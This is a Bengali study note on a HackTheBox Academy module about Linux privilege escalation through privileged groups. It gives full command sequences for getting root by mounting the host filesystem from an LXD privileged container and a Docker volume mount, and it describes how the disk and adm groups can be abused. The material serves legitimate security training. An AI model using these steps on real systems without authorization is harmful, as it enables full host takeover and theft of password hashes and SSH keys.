# Privileged Groups - [LINK](https://academy.hackthebox.com/app/module/51/section/477)


লিনাক্স সিস্টেমে কিছু নির্দিষ্ট গ্রুপ থাকে, যাদের সাধারণ ইউজারদের চেয়ে অনেক বেশি ক্ষমতা দেওয়া থাকে। সিস্টেম অ্যাডমিনরা অনেক সময় কাজের সুবিধার্থে সাধারণ ইউজারদের এই গ্রুপগুলোতে যুক্ত করে দেন। হ্যাকাররা এই সুযোগটি কাজে লাগিয়ে খুব সহজেই সিস্টেমের রুট (root) অ্যাক্সেস বা প্রিভিলেজ এসকালেশন করে ফেলতে পারে।

## ১. LXC / LXD গ্রুপ

LXD হলো উবুন্টুর একটি কন্টেইনার ম্যানেজার, যা অনেকটা ডকারের (Docker) মতো কাজ করে। এটি ইন্সটল করার পর ইউজারদের `lxd` গ্রুপে যুক্ত করা হয়। কোনো ইউজার যদি এই গ্রুপের মেম্বার হয়, তবে সে একটি বিশেষ কন্টেইনার তৈরি করে পুরো হোস্ট সিস্টেমের ফাইল সিস্টেম মাউন্ট করে ফেলতে পারে।

চলুন অ্যাটাকটি ধাপে ধাপে দেখে নিই:

**ধাপ ১: গ্রুপের মেম্বারশিপ চেক করা**

```bash
devops@NIX02:~$ id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

```

আউটপুটে দেখা যাচ্ছে `devops` ইউজারটি `lxd` গ্রুপের মেম্বার।

**ধাপ ২: কন্টেইনার ইমেজ প্রস্তুত করা (Alpine Image)**
কন্টেইনার বানানোর জন্য আমাদের একটি ইমেজ লাগবে। আমরা Alpine ইমেজ আনজিপ করব।

```bash
devops@NIX02:~$ unzip alpine.zip
devops@NIX02:~$ cd 64-bit\ Alpine/

```

**ধাপ ৩: LXD ইনিশিয়ালাইজ করা**
LXD চালু করার জন্য নিচের কমান্ডটি দিন এবং প্রতিটি প্রম্পটে ডিফল্ট (Enter) নির্বাচন করুন।

```bash
devops@NIX02:~$ lxd init

```

**ধাপ ৪: লোকাল ইমেজ ইম্পোর্ট করা**
আনজিপ করা ফাইলগুলো দিয়ে আমরা LXD তে `alpine` নামের একটি ইমেজ ইম্পোর্ট করব।

```bash
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

```

**ধাপ ৫: প্রিভিলেজড কন্টেইনার তৈরি করা**
এটি সবচেয়ে গুরুত্বপূর্ণ ধাপ। আমরা `r00t` নামের একটি কন্টেইনার তৈরি করব এবং `security.privileged=true` সেট করে দেব। এর মানে হলো, কন্টেইনারের ভেতরের রুট (Root) এবং হোস্ট মেশিনের আসল রুট একই ক্ষমতা পাবে।

```bash
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

```

**ধাপ ৬: হোস্ট ফাইল সিস্টেম মাউন্ট করা**
এবার আমরা হোস্ট মেশিনের মেইন রুট ডিরেক্টরি (`source=/`) কন্টেইনারের `/mnt/root` ডিরেক্টরির সাথে যুক্ত বা মাউন্ট করে দেব।

```bash
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

```

**ধাপ ৭: কন্টেইনার চালু করে রুট শেল নেওয়া**
এবার কন্টেইনারটি স্টার্ট করে আমরা এর ভেতরে শেল ওপেন করব।

```bash
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)

```

**ফলাফল:** আমরা কন্টেইনারের ভেতরে রুট হয়ে গেছি। এখন আমরা যদি `cd /mnt/root` কমান্ড দিই, তবে আমরা আসলে হোস্ট মেশিনের আসল ফাইল সিস্টেম দেখতে পাব। এখান থেকে আমরা অনায়াসে `/etc/shadow` ফাইল পড়ে পাসওয়ার্ড হ্যাক করতে পারি বা রুট ইউজারের SSH Key চুরি করতে পারি।

## ২. Docker (ডকার) গ্রুপ

কোনো ইউজারকে `docker` গ্রুপে যুক্ত করা আর তাকে পাসওয়ার্ড ছাড়াই রুট অ্যাক্সেস দিয়ে দেওয়া একদম একই কথা। এই গ্রুপের মেম্বাররা নতুন ডকার কন্টেইনার চালু করতে পারে।

**অ্যাটাক পেলোড:**

```bash
docker run -v /root:/mnt -it ubuntu

```

**পেলোডের সহজ ব্যাখ্যা:**

* `docker run`: নতুন কন্টেইনার রান করো।
* `-v /root:/mnt`: হোস্ট মেশিনের `/root` ফোল্ডারটিকে কন্টেইনারের `/mnt` ফোল্ডারের সাথে যুক্ত (Volume Mount) করো।
* `-it ubuntu`: উবুন্টু ইমেজ দিয়ে একটি ইন্টারঅ্যাকটিভ শেল তৈরি করো।

**ফলাফল:** এই কমান্ডটি চালানোর পর আপনি কন্টেইনারের ভেতরে ঢুকে যাবেন। এরপর `cd /mnt` কমান্ড দিলেই আপনি হোস্ট মেশিনের আসল `/root` ফোল্ডারে চলে যাবেন এবং সেখানে থাকা যেকোনো সেনসিটিভ ফাইল পড়তে বা পরিবর্তন করতে পারবেন।

## ৩. Disk (ডিস্ক) গ্রুপ

`disk` গ্রুপের ইউজারদের লিনাক্সের `/dev` ডিরেক্টরির যেকোনো ডিভাইসের ওপর পূর্ণ নিয়ন্ত্রণ (Full access) থাকে। যেমন: `/dev/sda1` হলো অপারেটিং সিস্টেমের মেইন হার্ডডিস্ক।

**কীভাবে অ্যাটাক করতে হয়:**
এই পারমিশন থাকলে আমরা `debugfs` নামের একটি টুল ব্যবহার করতে পারি। `debugfs` ব্যবহার করে সরাসরি হার্ডডিস্কের ভেতরের যেকোনো ফাইল সিস্টেম রুট লেভেলের ক্ষমতা নিয়ে পড়া বা এডিট করা যায়। এর মাধ্যমেও SSH কি বা ক্রেডেনশিয়াল চুরি করা অত্যন্ত সহজ।

## ৪. ADM (অ্যাডমিন) গ্রুপ

সিস্টেমের বিভিন্ন লগ (Log) ফাইল সাধারণত `/var/log` ফোল্ডারে রাখা হয়। `adm` গ্রুপের ইউজারদের এই ফোল্ডারের সমস্ত লগ ফাইল পড়ার পারমিশন থাকে।

```bash
secaudit@NIX02:~$ id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)

```

**দুর্বলতা:**
এই গ্রুপটি আপনাকে সরাসরি রুট (Root) অ্যাক্সেস দেবে না ঠিকই, কিন্তু লগ ফাইলের ভেতরে অনেক সংবেদনশীল তথ্য লুকিয়ে থাকে। যেমন, কোনো ইউজার ভুল করে পাসওয়ার্ডের জায়গায় কমান্ড টাইপ করলে তা লগে সেভ হয়ে যায়। এছাড়াও চলমান ক্রনজব (Cron jobs) এবং ইউজারের গতিবিধি বিশ্লেষণ করে প্রিভিলেজ এসকালেশনের অন্যান্য পথ বের করার জন্য এই লগ ফাইলগুলো দারুণ কার্যকরী।
